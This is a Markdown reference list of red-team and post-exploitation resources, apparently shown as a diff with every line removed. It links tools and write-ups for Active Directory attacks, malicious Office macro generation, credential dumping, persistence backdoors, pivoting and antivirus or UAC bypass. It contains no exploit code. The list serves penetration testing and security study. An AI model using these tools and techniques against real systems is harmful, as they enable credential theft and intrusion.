-	* [Hacking SQL Server on Scale with PowerShell - Secure360 2017](https://www.slideshare.net/nullbind/2017-secure360-hacking-sql-server-on-scale-with-powershell)
-* **Talks/Videos**
-	* [Automating the Empire with the Death Star: getting Domain Admin with a push of a button](https://byt3bl33d3r.github.io/automating-the-empire-with-the-death-star-getting-domain-admin-with-a-push-of-a-button.html)
-	* [Offensive Active Directory with Powershell](https://www.youtube.com/watch?v=cXWtu-qalSs)
-	* [Abusing Active Directory in Post-Exploitation](https://www.irongeek.com/i.php?page=videos/derbycon4/t105-abusing-active-directory-in-post-exploitation-carlos-perez)
-		* Windows APIs are often a blackbox with poor documentation, taking input and spewing output with little visibility on what actually happens in the background. By reverse engineering (and abusing) some of these seemingly benign APIs, we can effectively manipulate Windows into performing stealthy custom attacks using previously unknown persistent and injection techniques. In this talk, we’ll get Windows to play with itself nonstop while revealing 0day persistence, previously unknown DLL injection techniques, and Windows API tips and tricks. To top it all off, a custom HTTP beaconing backdoor will be released leveraging the newly released persistence and injection techniques. So much Windows abuse, so little time.
-	* [Advanced Targeted Attack. PoC Golden Ticket Attack - BSides Tampa 17](https://www.irongeek.com/i.php?page=videos/bsidestampa2017/102-advanced-targeted-attack-andy-thompson)
-	* [“I Hunt Sys Admins”](http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/)
-	* [I Hunt Sysadmins 2.0](http://www.slideshare.net/harmj0y/i-hunt-sys-admins-20)
-		* It covers various ways to hunt for users in Windows domains, including using PowerView.
-	* [Beyond the MCSE: Red Teaming Active Directory](https://www.youtube.com/watch?v=tEfwmReo1Hk)
-	* [Red vs Blue: Modern Active Directory Attacks & Defense - Defcon23](https://www.youtube.com/watch?v=rknpKIxT7NM)
-	* [Red Vs. Blue: Modern Active Directory Attacks, Detection, And Protection - BHUSA15](https://www.youtube.com/watch?v=b6GUXerE9Ac)
-	* [Abusing Active Directory in Post Exploitation - Carlos Perez - Derbycon 4](https://www.youtube.com/watch?v=sTU-70dD-Ok)
-	* [Requiem For An Admin, Walter Legowski (@SadProcessor) - BSides Amsterdam 2017](https://www.youtube.com/watch?v=uMg18TvLAcE&index=3&list=PLwZycuzv10iLBFwRIWNAR-s4iuuUMRuEB)
-		* Orchestrating BloodHound and Empire for Automated AD Post-Exploitation. Lateral Movement and Privilege Escalation are two of the main steps in the Active Directory attacker kill- chain. Applying the 'assume breach' mentality, more and more companies are asking for red-teaming type of assessments, and security researcher have therefor developed a wide range of open-source tools to assist them during these engagements. Out of these, two have quickly gained a solid reputation: PowerShell Empire and BloodHound (Both by @Harmj0y & ex-ATD Crew). In this Session, I will be presenting DogStrike, a new tool (PowerShell Modules) made to interface Empire & BloodHound, allowing penetration testers to merge their Empire infrastructure into the bloodhound graph database. Doing so allows the operator to request a bloodhound path that is 'Agent Aware', and makes it possible to automate the entire kill chain, from initial foothold to DA - or any desired part of an attacker's routine. Presentation will be demo-driven. Code for the module will be made public after the presentation. Automation of Active Directory post-exploitation is going to happen sooner than you might think. (Other tools are being released with the same goal*). Is it a good thing? Is it a bad thing? If I do not run out of time, I would like to finish the presentation by opening the discussion with the audience and see what the consequences of automated post- exploitation could mean, from the red, the blue or any other point of view... *: DeathStar by @Byt3Bl33d3r | GoFetch by @TalTheMaor.
-* **Tools**
-	* [Windows Vault Password Dumper](http://www.oxid.it/downloads/vaultdump.txt)
-		* The following code shows how to use native undocumented functions of Windows Vault API to enumerate and extract credentials stored by Microsoft Windows Vault. The code has been successfully tested on Windows7 and Windows8 operating systems.
-	* [DeathStar](https://github.com/byt3bl33d3r/DeathStar)
-		* DeathStar is a Python script that uses Empire's RESTful API to automate gaining Domain Admin rights in Active Directory environments using a variety of techinques.
-	* [pywerview](https://github.com/the-useless-one/pywerview)
-		* A (partial) Python rewriting of PowerSploit's PowerView
-	* [BloodHound](https://github.com/BloodHoundAD/BloodHound)
-		* BloodHound is a single page Javascript web application, built on top of Linkurious, compiled with Electron, with a Neo4j database fed by a PowerShell ingestor. BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Defenders can use BloodHound to identify and eliminate those same attack paths. Both blue and red teams can use BloodHound to easily gain a deeper understanding of privilege relationships in an Active Directory environment.
-		* [My First Go with BloodHound](https://blog.cobaltstrike.com/2016/12/14/my-first-go-with-bloodhound/)
-		* [Lay of the Land with BloodHound](http://threat.tevora.com/lay-of-the-land-with-bloodhound/)
-	* [ANGRYPUPPY](https://github.com/vysec/ANGRYPUPPY)
-		* Bloodhound Attack Path Execution for Cobalt Strike
-	* [AutoRuns PowerShell Module](https://github.com/p0w3rsh3ll/AutoRuns)
-		* AutoRuns module was designed to help do live incident response and enumerate autoruns artifacts that may be used by legitimate programs as well as malware to achieve persistence.
-	* [DomainTrustExplorer](https://github.com/sixdub/DomainTrustExplorer)
-		* Python script for analyis of the "Trust.csv" file generated by Veil PowerView. Provides graph based analysis and output.
-	* [GoFetch](https://github.com/GoFetchAD/GoFetch)
-		* GoFetch is a tool to automatically exercise an attack plan generated by the BloodHound application.  GoFetch first loads a path of local admin users and computers generated by BloodHound and converts it to its own attack plan format. Once the attack plan is ready, GoFetch advances towards the destination according to plan step by step, by successively applying remote code execution techniques and compromising credentials with Mimikatz.
-	* [Invoke-HostRecon](https://github.com/dafthack/HostRecon)
-		* This function runs a number of checks on a system to help provide situational awareness to a penetration tester during the reconnaissance phase. It gathers information about the local system, users, and domain information. It does not use any 'net', 'ipconfig', 'whoami', 'netstat', or other system commands to help avoid detection.
-	* [Invoke-ProcessScan](https://github.com/vysec/Invoke-ProcessScan)
-		* Gives context to a system. Uses EQGRP shadow broker leaked list to give some descriptions to processes.
-	* [Invoke-VNC](https://github.com/artkond/Invoke-Vnc)
-		* Powershell VNC injector
-	* [knit_brute.sh](https://gist.github.com/ropnop/8711392d5e1d9a0ba533705f7f4f455f)
-		* A quick tool to bruteforce an AD user's password by requesting TGTs from the Domain Controller with 'kinit'
-	* [LyncSniper](https://github.com/mdsecresearch/LyncSniper)
-		* A tool for penetration testing Skype for Business and Lync deployments
-		* [Blogpost/Writeup](https://www.mdsec.co.uk/2017/04/penetration-testing-skype-for-business-exploiting-the-missing-lync/)
-	* [PyKEK](https://github.com/bidord/pykek)
-		* PyKEK (Python Kerberos Exploitation Kit), a python library to manipulate KRB5-related data. (Still in development)`
-	* [SessionGopher](https://github.com/fireeye/SessionGopher)
-		* SessionGopher is a PowerShell tool that uses WMI to extract saved session information for remote access tools such as WinSCP, PuTTY, SuperPuTTY, FileZilla, and Microsoft Remote Desktop. It can be run remotely or locally.
-	* [7Zip4Powershell](https://github.com/thoemmi/7Zip4Powershell) * Powershell module for creating and extracting 7-Zip archives
-
-
-
-
-
-
-----------------
-### <a name="officemacro"></a>Office Macros
-**Office Macros**
-* **101**
-	* [Getting Started with VBA in Office](https://msdn.microsoft.com/en-us/vba/office-shared-vba/articles/getting-started-with-vba-in-office)
-* **General**
-	* [DLL Tricks with VBA to Improve Offensive Macro Capability](https://labs.mwrinfosecurity.com/blog/dll-tricks-with-vba-to-improve-offensive-macro-capability/)
-* **Tools**
-	* [MacroShop](https://github.com/khr0x40sh/MacroShop)
-		* Collection of scripts to aid in delivering payloads via Office Macros. 
-	* [Generate-Macro](https://github.com/enigma0x3/Generate-Macro)
-		* This Powershell script will generate a malicious Microsoft Office document with a specified payload and persistence method.
-	* [wePWNise](https://github.com/mwrlabs/wePWNise)
-		* WePWNise generates architecture independent VBA code to be used in Office documents or templates and automates bypassing application control and exploit mitigation software
-
-
-
-
-
--------------
-### <a name="email"></a>Email/Microsoft Exchange
-**Microsoft Exchange**
-* **101**
-* **General**
-	* [Outlook and Exchange for the Bad Guys Nick Landers](https://www.youtube.com/watch?v=cVhc9VOK5MY)
-	* [#OLEOutlook - bypass almost every Corporate security control with a point’n’click GUI](https://doublepulsar.com/oleoutlook-bypass-almost-every-corporate-security-control-with-a-point-n-click-gui-37f4cbc107d0)
-	* [Ruler Pivoting Through Exchange - Etienne Stalmans - TR17](https://www.youtube.com/watch?v=tuc8cwOAAcA)
-* **Tools**
-	* [MailSniper](https://github.com/dafthack/MailSniper)
-		* MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used as a non-administrative user to search their own email, or by an administrator to search the mailboxes of every user in a domain.
-	* [Ruler](https://github.com/sensepost/ruler)
-		* Ruler is a tool that allows you to interact with Exchange servers remotely, through either the MAPI/HTTP or RPC/HTTP protocol. The main aim is abuse the client-side Outlook features and gain a shell remotely.
-
-
-
-
-----------------------
-### <a name="grabbing">Grabbing Goodies</a>
-**Grabbing Goodies**
-* **Dumping Passwords**
-	* [CredCrack](https://github.com/gojhonny/CredCrack)
-		* CredCrack is a fast and stealthy credential harvester. It exfiltrates credentials recusively in memory and in the clear. Upon completion, CredCrack will parse and output the credentials while identifying any domain administrators obtained. CredCrack also comes with the ability to list and enumerate share access and yes, it is threaded! CredCrack has been tested and runs with the tools found natively in Kali Linux. CredCrack solely relies on having PowerSploit's "Invoke-Mimikatz.ps1" under the /var/www directory.
-	* [LaZagne](https://github.com/AlessandroZ/LaZagne/blob/master/README.md)
-		* The LaZagne project is an open source application used to retrieve lots of passwords stored on a local computer. Each software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). This tool has been developed for the purpose of finding these passwords for the most commonly-used software.
-	* [KeeThief](https://github.com/HarmJ0y/KeeThief)
-		* Methods for attacking KeePass 2.X databases, including extracting of encryption key material from memory.
-* **Writeups**
-	* [Post exploitation trick - Phish users for creds on domains, from their own box](https://enigma0x3.wordpress.com/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/) 
-	* [Dumping Windows Credentials](https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/)
-	* [Unofficial Guide to Mimikatz](https://adsecurity.org/?page_id=1821)
-	* [Capturing Windows 7 Credentials at Logon Using Custom Credential Provider](https://blog.leetsys.com/2012/01/02/capturing-windows-7-credentials-at-logon-using-custom-credential-provider/)
-		* The quick lowdown: I wrote a DLL capable of logging the credentials entered at logon for Windows Vista, 7 and future versions which you can download at http://www.leetsys.com/programs/credentialprovider/cp.zip. The credentials are logged to a file located at c:\cplog.txt. Simply copy the dll to the system32 directory and run the included register.reg script to create the necessary registry settings.
-	* [Dump Windows password hashes efficiently - Part 1](http://www.bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html)
-	* [Dumping hashes from Active Directory for cracking](http://blog.spiderlabs.com/2013/11/tutorial-for-ntds-goodness-vssadmin-wmis-ntdsdit-system-.html)
-	* [NTDSXtract - Active Directory Forensics Framework](http://www.ntdsxtract.com/)
-		* This framework was developed by the author in order to provide the community with a solution to extract forensically important information from the main database of Microsoft Active Directory (NTDS.DIT).
-	* [No one expect command execution!](http://0x90909090.blogspot.fr/2015/07/no-one-expect-command-execution.html)
-* **Tools**
-	* [You Can Type, but You Can’t Hide: A Stealthy GPU-based Keylogger](http://www.cs.columbia.edu/~mikepo/papers/gpukeylogger.eurosec13.pdf) 
-		* Keyloggers are a prominent class of malware that harvests sensitive data by recording any typed in information. Key- logger implementations strive to hide their presence using rootkit-like techniques to evade detection by antivirus and other system protections. In this paper, we present a new approach for implementing a stealthy keylogger: we explore the possibility of leveraging the graphics card as an alterna- tive environment for hosting the operation of a keylogger. The key idea behind our approach is to monitor the system’s keyboard buffer directly from the GPU via DMA, without any hooks or modifications in the kernel’s code and data structures besides the page table. The evaluation of our pro- totype implementation shows that a GPU-based keylogger can effectively record all user keystrokes, store them in the memory space of the GPU, and even analyze the recorded data in-place, with negligible runtime overhead.
-	* [SearchForCC](https://github.com/eelsivart/SearchForCC)
-		* A collection of open source/common tools/scripts to perform a system memory dump and/or process memory dump on Windows-based PoS systems and search for unencrypted credit card track data.
-	* [KeeFarce](https://github.com/denandz/KeeFarce)
-		* Extracts passwords from a KeePass 2.x database, directly from memory.
-	* [KeeThief](https://github.com/HarmJ0y/KeeThief)
-		* Methods for attacking KeePass 2.X databases, including extracting of encryption key material from memory.
-	* **Linux**
-		* [mimipenguin](https://github.com/huntergregal/mimipenguin)
-			* A tool to dump the login password from the current linux user
-	* **Windows**
-		* [mimikatz](https://github.com/gentilkiwi/mimikatz)
-			* [Mimikatz Overview, Defenses and Detection](https://www.sans.org/reading-room/whitepapers/detection/mimikatz-overview-defenses-detection-36780)
-			* [Mimikatz Logs and Netcat](http://blackpentesters.blogspot.com/2013/12/mimikatz-logs-and-netcat.html?m=1)
-		* [quarkspwdump](https://github.com/quarkslab/quarkspwdump)
-			* Dump various types of Windows credentials without injecting in any process.
-		* [SessionGopher](https://github.com/fireeye/SessionGopher)
-			* SessionGopher is a PowerShell tool that uses WMI to extract saved session information for remote access tools such as WinSCP, PuTTY, SuperPuTTY, FileZilla, and Microsoft Remote Desktop. It can be run remotely or locally.
-
-
-
------------
-### <a name="awareness"> Gaining Awareness/Situational Awareness </a>
-**Situational Awareness**
-* **Active Directory**
-	* [Domain Trusts: Why You Should Care](http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/)
-	* [Trusts You Might Have Missed](http://www.harmj0y.net/blog/redteaming/trusts-you-might-have-missed/)
-	* [pywerview](https://github.com/the-useless-one/pywerview)
-		* A (partial) Python rewriting of PowerSploit's PowerView
-	* [Veil-PowerView](https://github.com/Veil-Framework/Veil-PowerView)
-		* Veil-PowerView is a powershell tool to gain network situational awareness on Windows domains. It contains a set of pure-powershell replacements for various windows "net *" commands, which utilize powershell AD hooks and underlying Win32 API functions to perform useful Windows domain functionality.
-	* [PowerShell-AD-Recon](https://github.com/PyroTek3/PowerShell-AD-Recon)
-		* AD PowerShell Recon Scripts
-* **Linux**
-	* [How to determine Linux guest VM virtualization technology](https://www.cyberciti.biz/faq/linux-determine-virtualization-technology-command/)
-	* [How to determine Linux guest VM virtualization technology](https://www.cyberciti.biz/faq/linux-determine-virtualization-technology-command/)
-* **Egress Testing**	
-	* [Egress Testing using PowerShell](http://www.labofapenetrationtester.com/2014/04/egress-testing-using-powershell.html)
-	* [Egress Buster Reverse Shell](https://www.trustedsec.com/files/egress_buster_revshell.zip)
-		* Egress Buster Reverse Shell – Brute force egress ports until one if found and execute a reverse shell(from trustedsec)
-* **Network Awareness**
-	* [Packet sniffing with powershell](https://blogs.technet.microsoft.com/heyscriptingguy/2015/10/12/packet-sniffing-with-powershell-getting-started/)
-* **Miscellaneous**
-	* Finding your external IP:
-		* `Simply curl any of the following addresses: ident.me, ifconfig.me or whatsmyip.akamai.com`
-	* [Determine Public IP from CLI](http://askubuntu.com/questions/95910/command-for-determining-my-public-ip)
-
-
-
------------
-### Persistence
-**Persistence**
-* [List of low-level attacks/persistence techniques.  HIGHLY RECOMMENDED!](http://timeglider.com/timeline/5ca2daa6078caaf4)
-* #### Backdooring
-	* **Articles/Writeups**
-		* [I'm In Your $PYTHONPATH, Backdooring Your Python Programs](http://www.ikotler.org/InYourPythonPath.pdf)
-		* [Introduction to Manual Backdooring - abatchy17](http://www.abatchy.com/2017/05/introduction-to-manual-backdooring_24.html)
-		* [An Introduction to Backdooring Operating Systems for Fun and trolling - Defcon22](https://media.defcon.org/DEF%20CON%2022/DEF%20CON%2022%20video%20and%20slides/DEF%20CON%2022%20Hacking%20Conference%20Presentation%20By%20Nemus%20-%20An%20Introduction%20to%20Back%20Dooring%20Operating%20Systems%20for%20Fun%20and%20Trolling%20-%20Video%20and%20Slides.m4v)
-	* **Tools**
-		* [Pyekaboo](https://github.com/SafeBreach-Labs/pyekaboo)
-			* Pyekaboo is a proof-of-concept program that is able to to hijack/hook/proxy Python module(s) thanks to $PYTHONPATH variable. It's like "DLL Search Order Hijacking" for Python.
-		* [Pybuild](https://www.trustedsec.com/files/pybuild.zip)
-			* PyBuild is a tool for automating the pyinstaller method for compiling python code into an executable. This works on Windows, Linux, and OSX (pe and elf formats)(From trustedsec)
-		* [Debinject](https://github.com/UndeadSec/Debinject)
-			* Inject malicious code into .debs
-		* [WSUSpect Proxy](https://github.com/ctxis/wsuspect-proxy/)
-			* This is a proof of concept script to inject 'fake' updates into non-SSL WSUS traffic. It is based on our Black Hat USA 2015 presentation, 'WSUSpect – Compromising the Windows Enterprise via Windows Update'
-			* [Whitepaper](http://www.contextis.com/documents/161/CTX_WSUSpect_White_Paper.pdf)
-* ### **Windows Persistence**
-	* [Windows Event Log Driven Back Doors](http://blakhal0.blogspot.com/2015/03/windows-event-log-driven-back-doors.html)
-	* [Thousand ways to backdoor a Windows domain (forest)](http://jumpespjump.blogspot.com/2015/03/thousand-ways-to-backdoor-windows.html)
-	* [Windows Firewall Hook Enumeration](https://www.nccgroup.com/en/blog/2015/01/windows-firewall-hook-enumeration/)
-		* We’re going to look in detail at Microsoft Windows Firewall Hook drivers from Windows 2000, XP and 2003. This functionality was leveraged by the Derusbi family of malicious code to implement port-knocking like functionality. We’re going to discuss the problem we faced, the required reverse engineering to understand how these hooks could be identified and finally how the enumeration tool was developed.
-	* [NTFS Alternate Data Streams for pentesters (part 1)](https://labs.portcullis.co.uk/blog/ntfs-alternate-data-streams-for-pentesters-part-1/)
-	* [Using Alternate Data Streams to Persist on a Compromised Machine](https://enigma0x3.wordpress.com/2015/03/05/using-alternate-data-streams-to-persist-on-a-compromised-machine/)
-	* [WPAD Persistence](http://room362.com/post/2016/wpad-persistence/)
-* #### **Registry**
-	* [Windows Registry Attacks: Knowledge Is the Best Defense](https://www.redcanary.com/blog/windows-registry-attacks-threat-detection/)
-	* [Windows Registry Persistence, Part 1: Introduction, Attack Phases and Windows Services](http://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services)
-	* [Windows Registry Persistence, Part 2: The Run Keys and Search-Order](http://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order)
-	* [List of autorun keys / malware persistence Windows registry entries](https://www.peerlyst.com/posts/list-of-autorun-keys-malware-persistence-windows-registry-entries-benjamin-infosec)
-* #### **SC/Scheduled Tasks**
-	* [Sc](https://technet.microsoft.com/en-us/library/cc754599.aspx)
-		* Communicates with the Service Controller and installed services. The SC.exe program provides capabilities similar to those provided in Services in the Control Panel.
-	* [schtasks](https://technet.microsoft.com/en-us/library/cc725744.aspx)
-	* [Script Task](https://docs.microsoft.com/en-us/sql/integration-services/control-flow/script-task)
-		* Persistence Via MSSQL
-* #### **bitsadmin**
-	* [Temporal Persistence with bitsadmin and schtasks](http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html)
-/userland-persistence-with-scheduled-tasks-and-com-handler-hijacking/)
-* #### **COM**
-	* [COM Object hijacking: the discreet way of persistence](https://blog.gdatasoftware.com/blog/article/com-object-hijacking-the-discreet-way-of-persistence.html)
-	* [Userland Persistence with Scheduled Tasks and COM Handler Hijacking](https://enigma0x3.net/2016/05/25)
-* #### **Startup**
-	* [Windows Startup Application Database](http://www.pacs-portal.co.uk/startup_content.php)
-	* [SYSTEM Context Persistence in GPO Startup Scripts](https://cybersyndicates.com/2016/01/system-context-persistence-in-gpo-startup/)
-* #### **Shims**
-	* [Post Exploitation Persistence With Application Shims (Intro)](http://blacksunhackers.club/2016/08/post-exploitation-persistence-with-application-shims-intro/)
-	* [Shim Database Talks](http://sdb.tools/talks.html)
-* #### **Windows Instrumentation Management**
-	* [Abusing Windows Management  Instrumentation (WMI) to Build a Persistent,  Asyncronous, and Fileless Backdoor](https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf)
-
-
-* ### <a name="linpersist">Linux Persistence</a>
-
-
-
-----------------------
-### <a name="osxpersist">OS X Persistence</a>
-**OS X Persistence**
-* [What's the easiest way to have a script run at boot time in OS X? - Stack Overflow](https://superuser.com/questions/245713/whats-the-easiest-way-to-have-a-script-run-at-boot-time-in-os-x)
-* [Userland Persistence On Mac Os X "It Just Works"  -  Shmoocon 2015](http://www.securitytube.net/video/12428?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed:%20SecurityTube%20%28SecurityTube.Net%29)
-	* Got root on OSX? Do you want to persist between reboots and have access whenever you need it? You do not need plists, new binaries, scripts, or other easily noticeable techniques. Kext programming and kernel patching can be troublesome! Leverage already running daemon processes to guarantee your access.  As the presentation will show, if given userland administrative access (read: root), how easy it is to persist between reboots without plists, non-native binaries, scripting, and kexts or kernel patching using the Backdoor Factory.
-
-
-
-
------------------------
-### <a name="pivot">Pivoting and Lateral movement:</a>
-**Lateral Movement**
-* **Lateral Movement Techniques**
-	* [Lateral movement using excel application and dcom](https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)
-	* **Pass-The-Hash**
-		* [PsExec and the Nasty Things It Can Do](http://www.windowsecurity.com/articles-tutorials/misc_network_security/PsExec-Nasty-Things-It-Can-Do.html)
-			* An overview of what PsExec is and what its capabilities are from an administrative standpoint.
-		* [smbexec](https://github.com/pentestgeek/smbexec)
-			* A rapid psexec style attack with samba tools
-		* [Blogpost that inspired it](http://carnal0wnage.attackresearch.com/2012/01/psexec-fail-upload-and-exec-instead.html)
-		* [pth-toolkit I.e Portable pass the hash toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
-			* A modified version of the passing-the-hash tool collection https://code.google.com/p/passing-the-hash/ designed to be portable and work straight out of the box even on the most 'bare bones' systems
-		* [Pass-the-Hash is Dead: Long Live Pass-the-Hash](http://www.harmj0y.net/blog/penetesting/pass-the-hash-is-dead-long-live-pass-the-hash/)
-		* [Still Passing the Hash 15 Years Later: Using Keys to the Kingdom to Access Data - BH 2012](https://www.youtube.com/watch?v=O7WRojkYR00)
-		* [Still Passing the Hash 15 Years Later](http://passing-the-hash.blogspot.com/)
-		* [The Evolution of Protected Processes Part 1: Pass-the-Hash Mitigations in Windows 8.1](http://www.alex-ionescu.com/?p=97)
-		* [Et tu Kerberos - Christopher Campbell](https://www.youtube.com/watch?v=RIRQQCM4wz8)
-			* For over a decade we have been told that Kerberos is the answer to Microsoft’s authentication woes and now we know that isn’t the case. The problems with LM and NTLM are widely known- but the problems with Kerberos have only recently surfaced. In this talk we will look back at previous failures in order to look forward. We will take a look at what recent problems in Kerberos mean to your enterprise and ways you could possibly mitigate them. Attacks such as Spoofed-PAC- Pass-the-Hash- Golden Ticket- Pass-the-Ticket and Over-Pass-the-Ticket will be explained. Unfortunately- we don’t really know what is next – only that what we have now is broken.
-* **Pivoting**
-	* **Articles**
-		* [More on Using Bash's Built-in /dev/tcp File (TCP/IP)](http://www.linuxjournal.com/content/more-using-bashs-built-devtcp-file-tcpip More on Using Bash's Built-in /dev/tcp File (TCP/IP))
-		* [The Grammar of WMIC](https://isc.sans.edu/diary/The+Grammar+of+WMIC/2376)
-		* [Authenticated Remote Code Execution Methods in Windows](https://www.scriptjunkie.us/2013/02/authenticated-remote-code-execution-methods-in-windows/)
-		* [SOCKS: A protocol for TCP proxy across firewalls](https://www.openssh.com/txt/socks4.protocol) 
-		* [A Red Teamer's guide to pivoting](https://artkond.com/2017/03/23/pivoting-guide/#corporate-http-proxy-as-a-way-out)
-		* [Pivoting Ssh Reverse Tunnel Gateway](http://blog.oneiroi.co.uk/linux/pivoting-ssh-reverse-tunnel-gateway/)
-		* [Pivoting into a network using PLINK and FPipe](http://exploit.co.il/hacking/pivoting-into-a-network-using-plink-and-fpipe/)
-		* [Portfwd - Pivot from within meterpreter](http://www.offensive-security.com/metasploit-unleashed/Portfwd)
-		* [SSH Gymnastics and Tunneling with ProxyChains](http://magikh0e.ihtb.org/pubPapers/ssh_gymnastics_tunneling.html)
-		* [SSH Cheat Sheet - pentestmonkey](http://pentestmonkey.net/cheat-sheet/ssh-cheat-sheet)
-		* [Reverse SSL backdoor with socat and metasploit (and proxies)](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
-		* [How VPN Pivoting Works (with Source Code) - cs](https://blog.cobaltstrike.com/2014/10/14/how-vpn-pivoting-works-with-source-code/)
-		* [Universal TUN/TAP device driver. - kernel.org](https://www.kernel.org/pub/linux/kernel/people/marcelo/linux-2.4/Documentation/networking/tuntap.txt)
-		* [Tun/Tap interface tutorial - backreference](http://backreference.org/2010/03/26/tuntap-interface-tutorial/)
-		* [Pillage the Village Redux w/ Ed Skoudis & John Strand - SANS](https://www.youtube.com/watch?v=n2nptntIsn4)
-		* Decrypting IIS Passwords to Break Out of the DMZ	
-			* [Decrypting IIS Passwords to Break Out of the DMZ: Part 1 ](https://blog.netspi.com/decrypting-iis-passwords-to-break-out-of-the-dmz-part-1/)
-			* [Decrypting IIS Passwords to Break Out of the DMZ: Part 2](https://blog.netspi.com/decrypting-iis-passwords-to-break-out-of-the-dmz-part-2/)
-	* **Tools**
-		* [Piper](https://github.com/p3nt4/Piper)
-			* Creates a local or remote port forwarding through named pipes.
-		* [Socat](http://www.dest-unreach.org/socat/)
-			* socat is a relay for bidirectional data transfer between two independent data channels. Each of these data channels may be a file, pipe, device (serial line etc. or a pseudo terminal), a socket (UNIX, IP4, IP6 - raw, UDP, TCP), an SSL socket, proxy CONNECT connection, a file descriptor (stdin etc.), the GNU line editor (readline), a program, or a combination of two of these.  These modes include generation of "listening" sockets, named pipes, and pseudo terminals.
-			* [Examples of use](http://www.dest-unreach.org/socat/doc/socat.html#EXAMPLES)
-			* [Socat Cheatsheet](http://www.blackbytes.info/2012/07/socat-cheatsheet/)
-		* [SSHDog](https://github.com/Matir/sshdog)
-			* SSHDog is your go-anywhere lightweight SSH server. Written in Go, it aims to be a portable SSH server that you can drop on a system and use for remote access without any additional configuration.
-		* [SharpSocks](https://github.com/nettitude/SharpSocks)
-			* Tunnellable HTTP/HTTPS socks4a proxy written in C# and deployable via PowerShell
-		* [ssf - Secure Socket Funneling](https://github.com/securesocketfunneling/ssf)
-			* Network tool and toolkit. It provides simple and efficient ways to forward data from multiple sockets (TCP or UDP) through a single secure TLS tunnel to a remote computer. SSF is cross platform (Windows, Linux, OSX) and comes as standalone executables.
-		* [PowerCat](https://github.com/secabstraction/PowerCat)
-			* A PowerShell TCP/IP swiss army knife that works with Netcat & Ncat
-		* [Udp2raw-tunnel](https://github.com/wangyu-/udp2raw-tunnel)
-			* A Tunnel which tunnels UDP via FakeTCP/UDP/ICMP Traffic by using Raw Socket, helps you Bypass UDP FireWalls(or Unstable UDP Environment). Its Encrypted, Anti-Replay and Multiplexed. It also acts as a Connection Stabilizer.)
-		* [reGeorg](https://github.com/sensepost/reGeorg)
-			* The successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.
-
-
-
-
-----------------
-### <a name="av">Avoiding/Bypassing AV(Anti-Virus)/UAC/Whitelisting/Sandboxes/etc</a>
-**Avoiding/Bypassing Anti-Virus/Whitelisting/Sandboxes/etc**
-	* [Noob 101: Practical Techniques for AV Bypass - Jared Hoffman - ANYCON 2017](http://www.irongeek.com/i.php?page=videos/anycon2017/103-noob-101-practical-techniques-for-av-bypass-jared-hoffman)
-		* The shortcomings of anti-virus (AV) solutions have been well known for some time. Nevertheless, both public and private organizations continue to rely on AV software as a critical component of their information security programs, acting as a key protection mechanism over endpoints and other information systems within their networks. As a result, the security posture of these organizations is significantly jeopardized by relying only on this weakened control.
-	* [Batch, attach and patch: using windbg’s local kernel debugger to execute code in windows kernel](https://vallejo.cc/2015/06/07/batch-attach-and-patch-using-windbgs-local-kernel-debugger-to-execute-code-in-windows-kernel/)
-		* In this article I am going to describe a way to execute code in windows kernel by using windbg local kernel debugging. It’s not a vulnerability, I am going to use only windbg’s legal functionality, and I am going to use only a batch file (not powershell, or vbs, an old style batch only) and some Microsoft’s signed executables (some of them that are already in the system and windbg, that we will be dumped from the batch file). With this method it is not necessary to launch executables at user mode (only Microsoft signed executables) or load signed drivers. PatchGuard and other protections don’t stop us. We put our code directly into kernel memory space and we hook some point to get a thread executing it. As we will demonstrate, a malware consisting of a simple batch file would be able to jump to kernel, enabling local kernel debugging and using windbg to get its code being executed in kernel.
-	* [Research on CMSTP.exe](https://msitpros.com/?p=3960)
-		* Methods to bypass UAC and load a DLL over webdav 
-	* [Bypass Cylance Memory Exploitation Defense & Script Cntrl](https://www.xorrior.com/You-Have-The-Right-to-Remain-Cylance/)
-	* [Learn how to hide your trojans, backdoors, etc from anti virus.](https://www.hellboundhackers.org/articles/read-article.php?article_id=842)
-	* [AVLeak: Fingerprinting Antivirus Emulators Through Black-Box Testing](https://www.usenix.org/system/files/conference/woot16/woot16-paper-blackthorne_update.pdf)
-	* [rundll32 lockdown testing goodness](https://www.attackdebris.com/?p=143)
-	* [VMware Escape Exploit](https://github.com/unamer/vmware_escape)
-		* VMware Escape Exploit before VMware WorkStation 12.5.5
-	* [Breaking out of secured Python environments](http://tomforb.es/breaking-out-of-secured-python-environments)
-	* [Collection of Symantec Endpoint Protection Vulnerabilities + some exploits](http://codewhitesec.blogspot.nl/2015/07/symantec-endpoint-protection.html)
-	* [Hack Microsoft Using Microsoft Signed Binaries - Pierre-Alexandre Braeken](https://www.youtube.com/watch?v=V9AJ9M8_-RE&list=PLuUtcRxSUZUpv2An-RNhjuZSJ5fjY7ghe&index=15)
-	* [Hack Microsoft Using Microsoft Signed Binaries - BH17 - pierre - alexandre braeken](https://www.blackhat.com/docs/asia-17/materials/asia-17-Braeken-Hack-Microsoft-Using-Microsoft-Signed-Binaries-wp.pdf)
